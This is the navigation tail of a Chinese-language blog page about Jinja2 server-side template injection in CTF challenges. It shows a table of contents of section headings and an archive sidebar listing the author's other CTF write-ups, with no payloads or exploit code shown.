href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%8F%8A%E5%85%B6%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95%E7%89%B9%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">常见模板引擎及其模板语法特点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BA%86%E8%A7%A3%E4%B8%8D%E5%90%8C%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%EF%BC%9F"><span class="toc-number">1.2.1.</span> <span class="toc-text">为什么要了解不同模板引擎？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%89%E8%AF%AD%E8%A8%80%E5%88%92%E5%88%86%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">常见的模板引擎分类（按语言划分）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E9%9C%80%E8%A6%81%E8%AE%B0%E4%BD%8F%E7%9A%84%E9%87%8D%E7%82%B9%EF%BC%88%E5%85%88%E6%8E%8C%E6%8F%A1-Jinja2%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">你需要记住的重点（先掌握 Jinja2）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2-%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%8F%98%E9%87%8F%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">Jinja2 的基本利用方式和变量调试方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-SSTI%EF%BC%88%E6%B5%8B%E8%AF%95%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">判断是否存在 SSTI（测试表达式执行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%8F%98%E9%87%8F%EF%BC%88%E5%AF%BB%E6%89%BE%E2%80%9C%E5%AF%B9%E8%B1%A1%E2%80%9D%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">探测变量（寻找“对象”）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%E6%98%AF%EF%BC%9A"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">一个常见的调试技巧是：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B0-mro-%E2%86%92-%E7%88%B6%E7%B1%BB%E5%88%97%E8%A1%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">到 __mro__ → 父类列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E6%89%80%E6%9C%89%E5%AD%90%E7%B1%BB%EF%BC%88%E6%A0%B8%E5%BF%83%E6%8A%80%E5%B7%A7%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">找到所有子类（核心技巧）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8-Jinja2-%E4%B8%AD%E5%88%A9%E7%94%A8-subprocess-Popen-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">如何在 Jinja2 中利用 subprocess.Popen 执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%A6%82%E8%A7%88"><span class="toc-number">1.4.1.</span> <span class="toc-text">思路概览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%88%B0-subprocess-Popen%EF%BC%9F"><span class="toc-number">1.4.2.</span> <span class="toc-text">怎么找到 subprocess.Popen？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%A0-payload-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.3.</span> <span class="toc-text">造 payload 执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.4.4.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E8%BF%99%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-number">1.4.5.</span> <span class="toc-text">总结这一部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%96%B9%E4%BE%BF%E5%9C%B0%E6%89%BE-subclass-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0%E6%8A%80%E5%B7%A7"><span class="toc-number">1.5.</span> <span class="toc-text">更方便地找 subclass + 字符串构造技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%BC%95%E5%8F%B7%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8A%80%E5%B7%A7"><span class="toc-number">1.5.1.</span> <span class="toc-text">无引号构造字符串技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%94%A8-chr-%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">方法一：用 chr() 拼接字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E7%94%A8%E5%B7%B2%E7%9F%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">方法二：用已知字符串切片</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2-%E7%9A%84%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%92%8C%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%8A%80%E5%B7%A7%EF%BC%88%E8%BF%9B%E9%98%B6-SSTI%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">Jinja2 的沙箱逃逸和函数调用技巧（进阶 SSTI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B2%99%E7%AE%B1%EF%BC%88sandbox%EF%BC%89%EF%BC%9F"><span class="toc-number">1.6.1.</span> <span class="toc-text">什么是沙箱（sandbox）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E9%80%83%E9%80%B8%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.2.</span> <span class="toc-text">函数调用逃逸技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E4%B8%8E%E7%BB%83%E4%B9%A0%E6%96%B9%E5%90%91"><span class="toc-number">1.7.</span> <span class="toc-text">SSTI 实战技巧与练习方向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B8%B8%E7%94%A8%E7%9A%84-SSTI-%E5%A5%97%E8%B7%AF"><span class="toc-number">1.7.1.</span> <span class="toc-text">出题人常用的 SSTI 套路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B%E5%BB%BA%E8%AE%AE%EF%BC%88%E6%96%B0%E6%89%8B%E9%80%9A%E7%94%A8%EF%BC%89"><span class="toc-number">1.7.2.</span> <span class="toc-text">解题流程建议（新手通用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%9B%B4%E5%BC%BA%E5%A4%A7%E7%9A%84-Payload%EF%BC%88%E8%AF%BB%E5%8F%96%E5%8F%98%E9%87%8F%E3%80%81RCE-%E7%AD%89%EF%BC%89"><span class="toc-number">1.7.3.</span> <span class="toc-text">构造更强大的 Payload（读取变量、RCE 等）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%EF%BC%88%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%80%8E%E4%B9%88%E7%BB%A7%E7%BB%AD%E6%89%93-SSTI%EF%BC%89"><span class="toc-number">1.8.</span> <span class="toc-text">WAF 绕过技巧（过滤字符怎么继续打 SSTI）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E9%87%8D%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">🎯 重点总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SEETF-2023-File-Uploader-1"><span class="toc-number">2.</span> <span class="toc-text">[SEETF 2023]File Uploader 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FileLoader-%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">FileLoader 是干嘛的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF-0-flag-txt-%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">参数为什么是 (0, &#39;flag.txt&#39;)？</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 15
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/21</span>
+            <a class="archive-post-title" href="/2025/07/21/SSTI/">SSTI</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">L3NCTF-Web题目部分复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/sqlmap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/">sqlmap源码阅读小记</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%90%88%E9%9B%86/">反序列化题目合集</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span>
+            <a class="archive-post-title" href="/2025/07/16/Tomcat-JSP-servlet-war%E2%80%94%E2%80%94-WUSTCTF-2020-train-yourself-to-be-godly/">Tomcat,JSP,servlet,war——[WUSTCTF 2020]train yourself to be godly</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span>
+            <a class="archive-post-title" href="/2025/07/15/JAVA%E5%89%8D%E7%BD%AE%E6%A6%82%E5%BF%B5%E5%B0%8F%E8%AE%B0/">JAVA前置概念小记</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span>
+            <a class="archive-post-title" href="/2025/07/13/%E5%B0%8F%E5%88%BB%E4%B9%9F%E8%83%BD%E8%AF%BB%E6%87%82%E7%9A%84%E4%BD%86%E5%BE%85%E6%9B%B4%E2%80%94%E2%80%94-NCTF-2023-EvilMQ/">小刻也能读懂的但待更——[NCTF 2023]EvilMQ</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span>
+            <a class="archive-post-title" href="/2025/07/09/session-%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E2%80%94%E2%80%94-HNCTF-2022-QAQ-1inclu4e/">session 与条件竞争——[HNCTF 2022]QAQ_1inclu4e</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span>
+            <a class="archive-post-title" href="/2025/07/08/SOME-%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94-HCTF-2017-Deserted-place/">SOME 攻击—— [HCTF 2017]Deserted place</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/08</span>
+            <a class="archive-post-title" href="/2025/07/08/PHP-%E5%B8%B8%E8%A7%81%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94-HNCTF-2022-WEEK2-Canyource/">PHP 常见无参函数—— [HNCTF 2022 WEEK2]Canyource </a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/26</span>
+            <a class="archive-post-title" href="/2025/05/26/LitCTF-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/">LitCTF-Web方向题解</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span>
+            <a class="archive-post-title" href="/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/">傻子都能看懂的SSTI入门</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span>
+            <a class="archive-post-title" href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/">红队笔记</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span>
+            <a class="archive-post-title" href="/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">CTFSHOW 刷题汇总</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/">自动化漏洞通报</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="wp">
+                <span class="iconfont-archer">&#xe606;</span>
+                wp
+            </span>
+            <span class="sidebar-tag-name" data-tags="Nginx">
+                <span class="iconfont-archer">&#xe606;</span>
+                Nginx
+            </span>
+            <span class="sidebar-tag-name" data-tags="JAVA">
+                <span class="iconfont-archer">&#xe606;</span>
+                JAVA
+            </span>
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+            <span class="sidebar-tag-name" data-tags="WAF绕过">
+                <span class="iconfont-archer">&#xe606;</span>
+                WAF绕过
+            </span>
+            <span class="sidebar-tag-name" data-tags="PHP">
+                <span class="iconfont-archer">&#xe606;</span>
+                PHP
+            </span>
+            <span class="sidebar-tag-name" data-tags="无参">
+                <span class="iconfont-archer">&#xe606;</span>
+                无参
+            </span>
+            <span class="sidebar-tag-name" data-tags="Tomcat">
+                <span class="iconfont-archer">&#xe606;</span>
+                Tomcat
+            </span>
+            <span class="sidebar-tag-name" data-tags="Java">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java
+            </span>
+            <span class="sidebar-tag-name" data-tags="SOME">
+                <span class="iconfont-archer">&#xe606;</span>
+                SOME
+            </span>
+            <span class="sidebar-tag-name" data-tags="session">
+                <span class="iconfont-archer">&#xe606;</span>
+                session
+            </span>
+            <span class="sidebar-tag-name" data-tags="条件竞争">
+                <span class="iconfont-archer">&#xe606;</span>
+                条件竞争
+            </span>
+            <span class="sidebar-tag-name" data-tags="笔记">
+                <span class="iconfont-archer">&#xe606;</span>
+                笔记
+            </span>
+            <span class="sidebar-tag-name" data-tags="SSTI">
+                <span class="iconfont-archer">&#xe606;</span>
+                SSTI
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "温柔刀"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
